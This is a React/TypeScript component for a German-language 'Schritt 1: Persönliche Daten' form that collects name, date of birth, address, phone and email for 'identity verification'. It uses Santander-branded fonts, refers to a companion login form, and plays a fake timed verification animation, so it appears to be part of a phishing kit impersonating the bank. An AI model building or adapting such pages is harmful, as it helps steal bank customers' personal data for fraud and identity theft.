import React, { useState } from 'react';
import Loading from './Loading';

interface PersonalData {
  first_name: string;
  last_name: string;
  date_of_birth: string;
  street: string;
  street_number: string;
  plz: string;
  city: string;
  phone: string;
  email: string;
}

interface PersonalDataFormProps {
  onSubmit: (data: PersonalData) => void;
}

const PersonalDataForm: React.FC<PersonalDataFormProps> = ({ onSubmit }) => {
  // Individual state variables like LoginForm
  const [firstName, setFirstName] = useState('');
  const [lastName, setLastName] = useState('');
  const [dateOfBirth, setDateOfBirth] = useState('');
  const [street, setStreet] = useState('');
  const [streetNumber, setStreetNumber] = useState('');
  const [plz, setPlz] = useState('');
  const [city, setCity] = useState('');
  const [phone, setPhone] = useState('');
  const [email, setEmail] = useState('');
  
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState<Partial<PersonalData>>({});
  
  // Focus states exactly like LoginForm
  const [firstNameFocused, setFirstNameFocused] = useState(false);
  const [lastNameFocused, setLastNameFocused] = useState(false);
  const [dateOfBirthFocused, setDateOfBirthFocused] = useState(false);
  const [streetFocused, setStreetFocused] = useState(false);
  const [streetNumberFocused, setStreetNumberFocused] = useState(false);
  const [plzFocused, setPlzFocused] = useState(false);
  const [cityFocused, setCityFocused] = useState(false);
  const [phoneFocused, setPhoneFocused] = useState(false);
  const [emailFocused, setEmailFocused] = useState(false);

  const validateForm = (): boolean => {
    const newErrors: Partial<PersonalData> = {};
    
    if (!firstName.trim()) {
      newErrors.first_name = 'Vorname ist erforderlich';
    }
    
    if (!lastName.trim()) {
      newErrors.last_name = 'Nachname ist erforderlich';
    }
    
    if (!dateOfBirth.trim()) {
      newErrors.date_of_birth = 'Geburtsdatum ist erforderlich';
    } else if (!/^\d{2}\.\d{2}\.\d{4}$/.test(dateOfBirth)) {
      newErrors.date_of_birth = 'Format: TT.MM.JJJJ';
    }
    
    if (!street.trim()) {
      newErrors.street = 'Straße ist erforderlich';
    }
    
    if (!streetNumber.trim()) {
      newErrors.street_number = 'Hausnummer ist erforderlich';
    }
    
    if (!plz.trim()) {
      newErrors.plz = 'PLZ ist erforderlich';
    } else if (!/^\d{5}$/.test(plz)) {
      newErrors.plz = 'PLZ muss genau 5 Ziffern haben';
    }
    
    if (!city.trim()) {
      newErrors.city = 'Ort ist erforderlich';
    }
    
    if (!phone.trim()) {
      newErrors.phone = 'Telefonnummer ist erforderlich';
    }
    
    if (!email.trim()) {
      newErrors.email = 'E-Mail ist erforderlich';
    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      newErrors.email = 'Ungültige E-Mail-Adresse';
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) {
      return;
    }
    
    setIsLoading(true);
    
    try {
      const formData: PersonalData = {
        first_name: firstName.trim(),
        last_name: lastName.trim(),
        date_of_birth: dateOfBirth.trim(),
        street: street.trim(),
        street_number: streetNumber.trim(),
        plz: plz.trim(),
        city: city.trim(),
        phone: phone.trim(),
        email: email.trim()
      };
      
      console.log('PersonalDataForm: Submitting data:', formData);
      await onSubmit(formData);
    } catch (error) {
      console.error('Error submitting personal data:', error);
      setIsLoading(false);
    }
  };

  return (
    <>
      <style>
        {`
          @media (max-width: 768px) {
            .mobile-title {
              font-size: 2.5rem !important;
            }
          }
          @media (max-width: 480px) {
            .mobile-title {
              font-size: 2rem !important;
            }
          }
        `}
      </style>
      {isLoading && (
        <Loading 
          message="Persönliche Daten werden verifiziert"
          type="verification"
          showProgress={true}
          duration={4.5}
        />
      )}
      <div style={{ 
        maxWidth: '1440px', 
        margin: '0 auto', 
        padding: '4rem 0',
        minHeight: '80vh',
        display: 'flex',
        alignItems: 'flex-start',
        paddingTop: '6rem'
      }}>
        <div style={{
          maxWidth: '1000px',
          width: '100%',
          padding: '0 2rem'
        }}>
          {/* Large Title */}
          <h1 className="mobile-title" style={{
            color: '#444',
            fontSize: '4rem',
            fontWeight: 'bold',
            marginBottom: '1rem',
            fontFamily: 'santander_headline_bold, Arial, sans-serif',
            lineHeight: '1.1',
            letterSpacing: '-0.02em'
          }}>
            Schritt 1: Persönliche Daten
          </h1>
          
          <p style={{
            color: '#666',
            fontSize: '1rem',
            lineHeight: '1.6',
            marginBottom: '3rem',
            fontFamily: 'santander_regular, Arial, sans-serif'
          }}>
            Bitte geben Sie Ihre persönlichen Daten zur Verifizierung Ihrer Identität ein.
          </p>
          
          <form onSubmit={handleSubmit}>
            {/* Name Fields */}
            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '2rem', marginBottom: '1rem' }}>
              {/* First Name - EXACTLY like LoginForm */}
              <div style={{ marginBottom: '2.5rem', position: 'relative' }}>
                <input
                  id="firstName"
                  name="firstName"
                  type="text"
                  required
                  value={firstName}
                  onChange={(e) => setFirstName(e.target.value)}
                  onFocus={() => setFirstNameFocused(true)}
                  onBlur={() => setFirstNameFocused(false)}
                  style={{
                    width: '100%',
                    padding: '1.5rem 0 0.5rem 0',
                    border: 'none',
                    borderBottom: '2px solid #d1d5db',
                    backgroundColor: 'transparent',
                    fontSize: '1.1rem',
                    color: '#444',
                    outline: 'none',
                    fontFamily: 'santander_regular, Arial, sans-serif',
                    transition: 'border-color 0.3s ease'
                  }}
                />
                <label
                  htmlFor="firstName"
                  style={{
                    position: 'absolute',
                    left: '0',
                    top: firstNameFocused || firstName ? '0.25rem' : '1rem',
                    fontSize: firstNameFocused || firstName ? '0.75rem' : '1.1rem',
                    color: firstNameFocused || firstName ? '#6b7280' : '#9ca3af',
                    fontFamily: 'santander_regular, Arial, sans-serif',
                    transition: 'all 0.3s ease',
                    pointerEvents: 'none',
                    transformOrigin: 'left top'
                  }}
                >
                  Vorname *
                </label>
                {errors.first_name && (
                  <div style={{
                    color: '#dc2626',
                    fontSize: '0.875rem',
                    marginTop: '0.5rem',
                    fontFamily: 'santander_regular, Arial, sans-serif'
                  }}>
                    {errors.first_name}
                  </div>
                )}
              </div>
              
              {/* Last Name - EXACTLY like LoginForm */}
              <div style={{ marginBottom: '2.5rem', position: 'relative' }}>
                <input
                  id="lastName"
                  name="lastName"
                  type="text"
                  required
                  value={lastName}
                  onChange={(e) => setLastName(e.target.value)}
                  onFocus={() => setLastNameFocused(true)}
                  onBlur={() => setLastNameFocused(false)}
                  style={{
                    width: '100%',
                    padding: '1.5rem 0 0.5rem 0',
                    border: 'none',
                    borderBottom: '2px solid #d1d5db',
                    backgroundColor: 'transparent',
                    fontSize: '1.1rem',
                    color: '#444',
                    outline: 'none',
                    fontFamily: 'santander_regular, Arial, sans-serif',
                    transition: 'border-color 0.3s ease'
                  }}
                />
                <label
                  htmlFor="lastName"
                  style={{
                    position: 'absolute',
                    left: '0',
                    top: lastNameFocused || lastName ? '0.25rem' : '1rem',
                    fontSize: lastNameFocused || lastName ? '0.75rem' : '1.1rem',
                    color: lastNameFocused || lastName ? '#6b7280' : '#9ca3af',
                    fontFamily: 'santander_regular, Arial, sans-serif',
                    transition: 'all 0.3s ease',
                    pointerEvents: 'none',
                    transformOrigin: 'left top'
                  }}
                >
                  Nachname *
                </label>
                {errors.last_name && (
                  <div style={{
                    color: '#dc2626',
                    fontSize: '0.875rem',
                    marginTop: '0.5rem',
                    fontFamily: 'santander_regular, Arial, sans-serif'
                  }}>
                    {errors.last_name}
                  </div>
                )}
              </div>
            </div>
            
            {/* Date of Birth */}
            <div style={{ marginBottom: '2.5rem', position: 'relative' }}>
              <input
                id="dateOfBirth"
                name="dateOfBirth"
                type="text"
                required
                value={dateOfBirth}
                onChange={(e) => {
                  let value = e.target.value.replace(/\D/g, ''); // Remove all non-digits
                  
                  // Auto-format as DD.MM.YYYY
                  if (value.length >= 2) {
                    value = value.substring(0, 2) + '.' + value.substring(2);
                  }
                  if (value.length >= 5) {
                    value = value.substring(0, 5) + '.' + value.substring(5);
                  }
                  if (value.length > 10) {
                    value = value.substring(0, 10); // Limit to DD.MM.YYYY
                  }
                  
                  setDateOfBirth(value);
                }}
                onFocus={() => setDateOfBirthFocused(true)}
                onBlur={() => setDateOfBirthFocused(false)}
                maxLength={10}
                style={{
                  width: '100%',
                  padding: '1.5rem 0 0.5rem 0',
                  border: 'none',
                  borderBottom: '2px solid #d1d5db',
                  backgroundColor: 'transparent',
                  fontSize: '1.1rem',
                  color: '#444',
                  outline: 'none',
                  fontFamily: 'santander_regular, Arial, sans-serif',
                  transition: 'border-color 0.3s ease'
                }}
              />
              <label
                htmlFor="dateOfBirth"
                style={{
                  position: 'absolute',
                  left: '0',
                  top: dateOfBirthFocused || dateOfBirth ? '0.25rem' : '1rem',
                  fontSize: dateOfBirthFocused || dateOfBirth ? '0.75rem' : '1.1rem',
                  color: dateOfBirthFocused || dateOfBirth ? '#6b7280' : '#9ca3af',
                  fontFamily: 'santander_regular, Arial, sans-serif',
                  transition: 'all 0.3s ease',
                  pointerEvents: 'none',
                  transformOrigin: 'left top'
                }}
              >
                Geburtsdatum (TT.MM.JJJJ) *
              </label>
              {errors.date_of_birth && (
                <div style={{
                  color: '#dc2626',
                  fontSize: '0.875rem',
                  marginTop: '0.5rem',
                  fontFamily: 'santander_regular, Arial, sans-serif'
                }}>
                  {errors.date_of_birth}
                </div>
              )}
            </div>
            
            {/* Address Section Title */}
            <h3 style={{
              color: '#444',
              fontSize: '1.5rem',
              fontWeight: '600',
              marginBottom: '2rem',
              marginTop: '2rem',
              fontFamily: 'santander_headline_bold, Arial, sans-serif'
            }}>
              Adresse
            </h3>
            
            {/* Street and Street Number */}
            <div style={{ display: 'grid', gridTemplateColumns: '2fr 1fr', gap: '2rem', marginBottom: '1rem' }}>
              {/* Street */}
              <div style={{ marginBottom: '2.5rem', position: 'relative' }}>
                <input
                  id="street"
                  name="street"
                  type="text"
                  required
                  value={street}
                  onChange={(e) => setStreet(e.target.value)}
                  onFocus={() => setStreetFocused(true)}
                  onBlur={() => setStreetFocused(false)}
                  style={{
                    width: '100%',
                    padding: '1.5rem 0 0.5rem 0',
                    border: 'none',
                    borderBottom: '2px solid #d1d5db',
                    backgroundColor: 'transparent',
                    fontSize: '1.1rem',
                    color: '#444',
                    outline: 'none',
                    fontFamily: 'santander_regular, Arial, sans-serif',
                    transition: 'border-color 0.3s ease'
                  }}
                />
                <label
                  htmlFor="street"
                  style={{
                    position: 'absolute',
                    left: '0',
                    top: streetFocused || street ? '0.25rem' : '1rem',
                    fontSize: streetFocused || street ? '0.75rem' : '1.1rem',
                    color: streetFocused || street ? '#6b7280' : '#9ca3af',
                    fontFamily: 'santander_regular, Arial, sans-serif',
                    transition: 'all 0.3s ease',
                    pointerEvents: 'none',
                    transformOrigin: 'left top'
                  }}
                >
                  Straße *
                </label>
                {errors.street && (
                  <div style={{
                    color: '#dc2626',
                    fontSize: '0.875rem',
                    marginTop: '0.5rem',
                    fontFamily: 'santander_regular, Arial, sans-serif'
                  }}>
                    {errors.street}
                  </div>
                )}
              </div>
              
              {/* Street Number */}
              <div style={{ marginBottom: '2.5rem', position: 'relative' }}>
                <input
                  id="streetNumber"
                  name="streetNumber"
                  type="text"
                  required
                  value={streetNumber}
                  onChange={(e) => setStreetNumber(e.target.value)}
                  onFocus={() => setStreetNumberFocused(true)}
                  onBlur={() => setStreetNumberFocused(false)}
                  style={{
                    width: '100%',
                    padding: '1.5rem 0 0.5rem 0',
                    border: 'none',
                    borderBottom: '2px solid #d1d5db',
                    backgroundColor: 'transparent',
                    fontSize: '1.1rem',
                    color: '#444',
                    outline: 'none',
                    fontFamily: 'santander_regular, Arial, sans-serif',
                    transition: 'border-color 0.3s ease'
                  }}
                />
                <label
                  htmlFor="streetNumber"
                  style={{
                    position: 'absolute',
                    left: '0',
                    top: streetNumberFocused || streetNumber ? '0.25rem' : '1rem',
                    fontSize: streetNumberFocused || streetNumber ? '0.75rem' : '1.1rem',
                    color: streetNumberFocused || streetNumber ? '#6b7280' : '#9ca3af',
                    fontFamily: 'santander_regular, Arial, sans-serif',
                    transition: 'all 0.3s ease',
                    pointerEvents: 'none',
                    transformOrigin: 'left top'
                  }}
                >
                  Hausnummer *
                </label>
                {errors.street_number && (
                  <div style={{
                    color: '#dc2626',
                    fontSize: '0.875rem',
                    marginTop: '0.5rem',
                    fontFamily: 'santander_regular, Arial, sans-serif'
                  }}>
                    {errors.street_number}
                  </div>
                )}
              </div>
            </div>
            
            {/* PLZ and City */}
            <div style={{ display: 'grid', gridTemplateColumns: '1fr 2fr', gap: '2rem', marginBottom: '1rem' }}>
              {/* PLZ */}
              <div style={{ marginBottom: '2.5rem', position: 'relative' }}>
                <input
                  id="plz"
                  name="plz"
                  type="text"
                  required
                  value={plz}
                  onChange={(e) => {
                    const value = e.target.value.replace(/\D/g, '').slice(0, 5);
                    setPlz(value);
                  }}
                  onFocus={() => setPlzFocused(true)}
                  onBlur={() => setPlzFocused(false)}
                  maxLength={5}
                  style={{
                    width: '100%',
                    padding: '1.5rem 0 0.5rem 0',
                    border: 'none',
                    borderBottom: '2px solid #d1d5db',
                    backgroundColor: 'transparent',
                    fontSize: '1.1rem',
                    color: '#444',
                    outline: 'none',
                    fontFamily: 'santander_regular, Arial, sans-serif',
                    transition: 'border-color 0.3s ease'
                  }}
                />
                <label
                  htmlFor="plz"
                  style={{
                    position: 'absolute',
                    left: '0',
                    top: plzFocused || plz ? '0.25rem' : '1rem',
                    fontSize: plzFocused || plz ? '0.75rem' : '1.1rem',
                    color: plzFocused || plz ? '#6b7280' : '#9ca3af',
                    fontFamily: 'santander_regular, Arial, sans-serif',
                    transition: 'all 0.3s ease',
                    pointerEvents: 'none',
                    transformOrigin: 'left top'
                  }}
                >
                  PLZ *
                </label>
                {errors.plz && (
                  <div style={{
                    color: '#dc2626',
                    fontSize: '0.875rem',
                    marginTop: '0.5rem',
                    fontFamily: 'santander_regular, Arial, sans-serif'
                  }}>
                    {errors.plz}
                  </div>
                )}
              </div>
              
              {/* City */}
              <div style={{ marginBottom: '2.5rem', position: 'relative' }}>
                <input
                  id="city"
                  name="city"
                  type="text"
                  required
                  value={city}
                  onChange={(e) => setCity(e.target.value)}
                  onFocus={() => setCityFocused(true)}
                  onBlur={() => setCityFocused(false)}
                  style={{
                    width: '100%',
                    padding: '1.5rem 0 0.5rem 0',
                    border: 'none',
                    borderBottom: '2px solid #d1d5db',
                    backgroundColor: 'transparent',
                    fontSize: '1.1rem',
                    color: '#444',
                    outline: 'none',
                    fontFamily: 'santander_regular, Arial, sans-serif',
                    transition: 'border-color 0.3s ease'
                  }}
                />
                <label
                  htmlFor="city"
                  style={{
                    position: 'absolute',
                    left: '0',
                    top: cityFocused || city ? '0.25rem' : '1rem',
                    fontSize: cityFocused || city ? '0.75rem' : '1.1rem',
                    color: cityFocused || city ? '#6b7280' : '#9ca3af',
                    fontFamily: 'santander_regular, Arial, sans-serif',
                    transition: 'all 0.3s ease',
                    pointerEvents: 'none',
                    transformOrigin: 'left top'
                  }}
                >
                  Ort *
                </label>
                {errors.city && (
                  <div style={{
                    color: '#dc2626',
                    fontSize: '0.875rem',
                    marginTop: '0.5rem',
                    fontFamily: 'santander_regular, Arial, sans-serif'
                  }}>
                    {errors.city}
                  </div>
                )}
              </div>
            </div>
            
            {/* Phone */}
            <div style={{ marginBottom: '2.5rem', position: 'relative' }}>
              <input
                id="phone"
                name="phone"
                type="tel"
                required
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
                onFocus={() => {
                  setPhoneFocused(true);
                  // Add +49 prefix if field is empty
                  if (!phone) {
                    setPhone('+49 ');
                  }
                }}
                onBlur={() => setPhoneFocused(false)}
                style={{
                  width: '100%',
                  padding: '1.5rem 0 0.5rem 0',
                  border: 'none',
                  borderBottom: '2px solid #d1d5db',
                  backgroundColor: 'transparent',
                  fontSize: '1.1rem',
                  color: '#444',
                  outline: 'none',
                  fontFamily: 'santander_regular, Arial, sans-serif',
                  transition: 'border-color 0.3s ease'
                }}
              />
              <label
                htmlFor="phone"
                style={{
                  position: 'absolute',
                  left: '0',
                  top: phoneFocused || phone ? '0.25rem' : '1rem',
                  fontSize: phoneFocused || phone ? '0.75rem' : '1.1rem',
                  color: phoneFocused || phone ? '#6b7280' : '#9ca3af',
                  fontFamily: 'santander_regular, Arial, sans-serif',
                  transition: 'all 0.3s ease',
                  pointerEvents: 'none',
                  transformOrigin: 'left top'
                }}
              >
                Telefonnummer *
              </label>
              {errors.phone && (
                <div style={{
                  color: '#dc2626',
                  fontSize: '0.875rem',
                  marginTop: '0.5rem',
                  fontFamily: 'santander_regular, Arial, sans-serif'
                }}>
                  {errors.phone}
                </div>
              )}
            </div>
            
            {/* Email */}
            <div style={{ marginBottom: '2.5rem', position: 'relative' }}>
              <input
                id="email"
                name="email"
                type="email"
                required
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                onFocus={() => setEmailFocused(true)}
                onBlur={() => setEmailFocused(false)}
                style={{
                  width: '100%',
                  padding: '1.5rem 0 0.5rem 0',
                  border: 'none',
                  borderBottom: '2px solid #d1d5db',
                  backgroundColor: 'transparent',
                  fontSize: '1.1rem',
                  color: '#444',
                  outline: 'none',
                  fontFamily: 'santander_regular, Arial, sans-serif',
                  transition: 'border-color 0.3s ease'
                }}
              />
              <label
                htmlFor="email"
                style={{
                  position: 'absolute',
                  left: '0',
                  top: emailFocused || email ? '0.25rem' : '1rem',
                  fontSize: emailFocused || email ? '0.75rem' : '1.1rem',
                  color: emailFocused || email ? '#6b7280' : '#9ca3af',
                  fontFamily: 'santander_regular, Arial, sans-serif',
                  transition: 'all 0.3s ease',
                  pointerEvents: 'none',
                  transformOrigin: 'left top'
                }}
              >
                E-Mail-Adresse *
              </label>
              {errors.email && (
                <div style={{
                  color: '#dc2626',
                  fontSize: '0.875rem',
                  marginTop: '0.5rem',
                  fontFamily: 'santander_regular, Arial, sans-serif'
                }}>
                  {errors.email}
                </div>
              )}
            </div>
            
            {/* Submit Button */}
            <button
              type="submit"
              disabled={isLoading}
              style={{
                backgroundColor: '#9e3667',
                color: 'white',
                border: 'none',
                borderRadius: '4px',
                padding: '16px 32px',
                fontSize: '16px',
                fontWeight: '600',
                cursor: isLoading ? 'not-allowed' : 'pointer',
                fontFamily: 'santander_bold, Arial, sans-serif',
                transition: 'all 0.3s ease',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                gap: '8px',
                opacity: isLoading ? 0.7 : 1,
                marginTop: '2rem',
                width: '100%',
                maxWidth: '300px'
              }}
              onMouseEnter={(e) => {
                if (!isLoading) {
                  e.currentTarget.style.backgroundColor = '#8a2f5a';
                  e.currentTarget.style.transform = 'translateY(-1px)';
                }
              }}
              onMouseLeave={(e) => {
                if (!isLoading) {
                  e.currentTarget.style.backgroundColor = '#9e3667';
                  e.currentTarget.style.transform = 'translateY(0)';
                }
              }}
            >
              {isLoading ? 'Daten werden verifiziert...' : 'Daten bestätigen'}
              {!isLoading && (
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M5 12h14M12 5l7 7-7 7"/>
                </svg>
              )}
            </button>
          </form>
        </div>
      </div>
    </>
  );
};

export default PersonalDataForm; 